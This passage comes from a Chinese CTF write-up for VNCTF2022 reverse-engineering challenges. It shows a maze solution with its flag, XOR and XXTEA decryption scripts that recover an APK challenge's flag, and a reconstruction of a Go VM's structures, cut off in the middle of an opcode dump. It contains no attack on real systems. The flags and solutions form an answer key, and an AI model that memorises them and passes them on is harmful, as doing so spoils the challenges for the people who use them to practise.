class="line"><span class="comment"># #.#...#.......#...#...#.#...#.#</span></span><br><span class="line"><span class="comment"># #.#####.#########.#####.#.#.#.#</span></span><br><span class="line"><span class="comment"># #...#...#.............#...#...#</span></span><br><span class="line"><span class="comment"># ###.#.###.#############.#######</span></span><br><span class="line"><span class="comment"># #...#.#...#.........#...#...#.#</span></span><br><span class="line"><span class="comment"># #.###.#.###.#######.#.###.#.#.#</span></span><br><span class="line"><span class="comment"># #.....#.#...#...#.#.#...#.#...#</span></span><br><span class="line"><span class="comment"># #######.#.###.#.#.#.###.#.###.#</span></span><br><span class="line"><span class="comment"># #.......#.....#...#.#...#.#...#</span></span><br><span class="line"><span class="comment"># #.###############.#.#.###.#.###</span></span><br><span class="line"><span class="comment"># #.......#.......#.#...#...#...#</span></span><br><span class="line"><span class="comment"># #.#####.#.#.#.###.#####.#######</span></span><br><span class="line"><span class="comment"># #.#...#.#.#.#.#...#...........#</span></span><br><span class="line"><span class="comment"># #.#.#.#.#.#.###.###.#####.###.#</span></span><br><span class="line"><span class="comment"># #.#.#.#.#.#...#...#.#...#.#...#</span></span><br><span class="line"><span class="comment"># #.#.###.#.###.###.#.#.#.###.###</span></span><br><span class="line"><span class="comment"># #...#...#.#.....#.#.#.#...#...#</span></span><br><span class="line"><span class="comment"># #.###.#.#.#.#####.#.#.###.#.#.#</span></span><br><span class="line"><span class="comment"># #.#...#.#.#.......#.#.#.#.#.#.#</span></span><br><span class="line"><span class="comment"># #.#.###.#.###########.#.#.#.#.#</span></span><br><span class="line"><span class="comment"># #.#...#.#.#.........#.#.#.#.#.#</span></span><br><span class="line"><span class="comment"># #.###.#.#.#####.#.#.#.#.#.#.#.#</span></span><br><span class="line"><span class="comment"># #...#.#.#.....#.#.#...#...#.#.#</span></span><br><span class="line"><span class="comment"># #####.#######.###.#######.###.#</span></span><br><span class="line"><span class="comment"># #.....#.....#...#.......#.....#</span></span><br><span class="line"><span class="comment"># #.#####.###.###.#######.#####.#</span></span><br><span class="line"><span class="comment"># #.........#.............#....G#</span></span><br><span class="line"><span class="comment"># ###############################</span></span><br><span class="line"><span class="comment"># ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss</span></span><br><span class="line"><span class="comment"># 801f190737434100e7d2790bd5b0732e</span></span><br></pre></td></tr></table></figure><blockquote><p>关于python字节码的反汇编，可以看这个文章学习 <a href="https://song-10.gitee.io/2020/04/20/Reverse-2020-04-20-python-byte/">https://song-10.gitee.io/2020/04/20/Reverse-2020-04-20-python-byte/</a></p></blockquote><h2 id="2-cm1"><a href="#2-cm1" class="headerlink" title="2.cm1"></a>2.cm1</h2><p>是个APK文件，拖入JEB进行分析</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222091235362.png" class="" title="image-20220222091235362"><p>发现关键check函数放在了解密后的ooo文件中，进入copyFiles函数观察如何解密的</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222091605036.png" class="" title="image-20220222091605036"><p>是以1024为1组，异或vn2022，写脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ooo&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = <span class="built_in">list</span>(f.read())</span><br><span class="line">key = <span class="string">b&quot;vn2022&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">    content[i] ^= key[(i % <span class="number">1024</span>) % <span class="number">6</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oooo&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(content))</span><br></pre></td></tr></table></figure><p>然后用jadx打开opoo，找到hcheck</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222102803426.png" class="" title="image-20220222102803426"><p>是xxtea加密，写脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: a = <span class="string">b&quot;H4pPY_VNCTF!!OvO&quot;</span></span><br><span class="line">In [<span class="number">19</span>]: struct.unpack(<span class="string">&quot;&lt;IIII&quot;</span>, a)</span><br><span class="line">Out[<span class="number">19</span>]: (<span class="number">1349530696</span>, <span class="number">1314283353</span>, <span class="number">558257219</span>, <span class="number">1333153569</span>)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> * v,  <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> * key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  rounds = (<span class="number">52</span> / n) + <span class="number">6</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  sum = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p;</span><br><span class="line"><span class="keyword">while</span> (rounds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">sum -= <span class="number">1640531527</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">v[p] += ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">z = v[p];</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">v[n - <span class="number">1</span>] += ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">rounds--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>* v,  <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  rounds = (<span class="number">52</span> / n) + <span class="number">6</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sum =<span class="number">0</span> - (<span class="number">1640531527</span> * rounds), z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">while</span> (rounds &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">v[p] -= ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">y = v[p];</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">v[<span class="number">0</span>] -= ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">sum += <span class="number">1640531527</span>;</span><br><span class="line">rounds--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> c[] = &#123; <span class="number">68</span>, <span class="number">39</span>, <span class="number">-92</span>, <span class="number">108</span>, <span class="number">-82</span>, <span class="number">-18</span>, <span class="number">72</span>, <span class="number">-55</span>, <span class="number">74</span>, <span class="number">-56</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">-40</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">99</span>, <span class="number">-82</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">-71</span>, <span class="number">-58</span>, <span class="number">-57</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">38</span>, <span class="number">-44</span>, <span class="number">-39</span>, <span class="number">-60</span>, <span class="number">113</span>, <span class="number">-2</span>, <span class="number">92</span>, <span class="number">-75</span>, <span class="number">118</span>, <span class="number">-77</span>, <span class="number">50</span>, <span class="number">-121</span>, <span class="number">43</span>, <span class="number">32</span>, <span class="number">-106</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123; <span class="number">1349530696</span>, <span class="number">1314283353</span>, <span class="number">558257219</span>, <span class="number">1333153569</span> &#125;;</span><br><span class="line"><span class="built_in">decrypt</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)c, <span class="number">11</span>, key);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//VNCTF&#123;93ee7688-f216-42cb-a5c2-191ff4e412ba&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-cm狗"><a href="#3-cm狗" class="headerlink" title="3.cm狗"></a>3.cm狗</h2><p>拿到题目，发现是用go语言实现的VM，直接用IDA7.6打开</p><p>根据<code>main.(_ptr_MzVm).init</code> 和 <code>main.(_ptr_MzVm).run</code>  2个函数，找到VM的大体结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">func</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *call;</span><br><span class="line">    vm *vmm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD REG[<span class="number">21</span>];</span><br><span class="line">    DWORD stack[<span class="number">1000</span>];</span><br><span class="line">    DWORD _eip;</span><br><span class="line">    DWORD _esp;</span><br><span class="line">    DWORD _ebp;</span><br><span class="line">    QWORD * data;   <span class="comment">//指向OPCODE</span></span><br><span class="line">    func * function[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> is_exit;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">params</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD parm1;</span><br><span class="line">    DWORD parm2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加结构体到IDA中，发现瞬间函数变的非常的清晰</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222214328590.png" class="" title="image-20220222214328590"><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222214346567.png" class="" title="image-20220222214346567"><p>慢慢分析每个func的功能，然后把OPCODE提取出来，写脚本打印伪代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000057</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000065</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000063</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000065</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000020</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000074</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000020</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000056</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000032</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000032</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000032</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000021</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000069</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000070</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000075</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000074</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000020</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000066</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000061</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000067</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000049</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000061</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, 